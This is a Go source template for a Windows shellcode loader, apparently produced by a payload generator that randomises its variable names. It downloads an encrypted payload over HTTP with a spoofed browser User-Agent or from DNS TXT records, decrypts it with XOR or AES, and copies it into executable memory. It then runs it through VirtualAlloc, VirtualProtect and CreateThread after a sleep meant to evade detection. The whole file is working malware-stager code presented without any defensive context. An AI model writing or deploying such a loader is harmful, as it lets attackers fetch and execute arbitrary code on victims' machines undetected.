package main

import (
  "encoding/base64"
  "syscall"
  "unsafe"
  "io/ioutil"
  "net/http"
  "net"
  "crypto/aes"
  "crypto/cipher"
  "fmt"
  "time"
)

func HTTPDownload(download_src string) string {
	req, _ := http.NewRequest("GET", download_src, nil)
        req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36")
        client := &http.Client{}
        resp, _ := client.Do(req)

        defer resp.Body.Close()

        content, _ := ioutil.ReadAll(resp.Body)
        
	return string(content)
}

func DNSDownload(download_src string) string {
	records, _ := net.LookupTXT(download_src)

	return records[0] 
}

func DecryptAES(ciphertext, key []byte) []byte {
	c, _ := aes.NewCipher(key)
	
	IV := []byte("1234567812345678")

	stream := cipher.NewCTR(c, IV)
	stream.XORKeyStream(ciphertext, ciphertext)

	return ciphertext
}

func DecryptXOR(ciphertext, key []byte) []byte {
	plaintext := make([]byte, len(ciphertext))
	
	for i := 0; i < len(ciphertext); i++ {
		plaintext[i] = ciphertext[i] ^ key[i % len(key)]
	}

	return plaintext
}

func ExecuteWaitForSingleObject(plaintext []byte, debug bool) {
	{{PAGE_READWRITE}} := 0x04

	// load dlls
    {{KERNEL_32}} := syscall.NewLazyDLL("kernel32.dll")
    {{NTDLL}} := syscall.NewLazyDLL("ntdll.dll")

	// shellcode prep
	{{VIRTUAL_ALLOC}} := {{KERNEL_32}}.NewProc("VirtualAlloc")
	{{VIRTUAL_PROTECT}} := {{KERNEL_32}}.NewProc("VirtualProtect")
	{{RTL_COPY_MEMORY}} := {{NTDLL}}.NewProc("RtlCopyMemory")
	{{CREATE_THREAD}} := {{KERNEL_32}}.NewProc("CreateThread")
	{{WAIT_FOR_SINGLE_OBJECT}} := {{KERNEL_32}}.NewProc("WaitForSingleObject")

	{{TMP_ADDRESS}}, _, _ := {{VIRTUAL_ALLOC}}.Call(uintptr(0), uintptr(len(plaintext)), 0x1000|0x2000, 0x04)

	{{RTL_COPY_MEMORY}}.Call({{TMP_ADDRESS}}, (uintptr)(unsafe.Pointer(&plaintext[0])), uintptr(len(plaintext)))

	{{TMP_PROTECT}} := {{PAGE_READWRITE}}
	{{VIRTUAL_PROTECT}}.Call({{TMP_ADDRESS}}, uintptr(len(plaintext)), 0x20, uintptr(unsafe.Pointer(&{{TMP_PROTECT}})))

	if debug {
		fmt.Println("[+] Sleeping...")
		time.Sleep(30 * time.Second)
	} else {
		time.Sleep(5 * time.Second)
	}

	// shellcode exec
	{{THREAD}}, _, _ := {{CREATE_THREAD}}.Call(0, 0, {{TMP_ADDRESS}}, uintptr(0), 0, 0)
	{{WAIT_FOR_SINGLE_OBJECT}}.Call({{THREAD}}, 0xFFFFFFFF)
}

func main() {
	// template variables
	download_src := "{{DOWNLOAD_SRC}}"
	debug := {{DEBUG}}
	crypter_mode := "{{CRYPTER_MODE}}"
	execution_mode := "{{EXECUTION_MODE}}"
	download_mode := "{{DOWNLOAD_MODE}}"
    key := "{{KEY}}"
    randomizer := "{{RANDOMIZER}}"

	ciphertext_b64 := ""
	var plaintext []byte

	if debug {
        fmt.Println("[+] Randomizer: ", randomizer)
		fmt.Println("[+] Key: ", key)
		fmt.Println("[+] Execution mode: ", execution_mode)
	}

	// download payload, base64 formatted string
	if download_mode == "dns" {
		ciphertext_b64 = DNSDownload(download_src)
	} else {
		ciphertext_b64 = HTTPDownload(download_src)
	}

	if debug {
		fmt.Println("[+] Ciphertext: ", ciphertext_b64)
	}

	// base64 decode payload, now we have the ciphertext in byte array format
    ciphertext, _ := base64.StdEncoding.DecodeString(string(ciphertext_b64))
  
	// decrypt ciphertext, still in byte array format, this is the shellcode
	if crypter_mode == "xor" {
		plaintext = DecryptXOR(ciphertext, []byte(key))
	} else if crypter_mode == "aes" {
		plaintext = DecryptAES(ciphertext, []byte(key))
	} else {
		plaintext = ciphertext
	}

	ExecuteWaitForSingleObject(plaintext, debug)
}
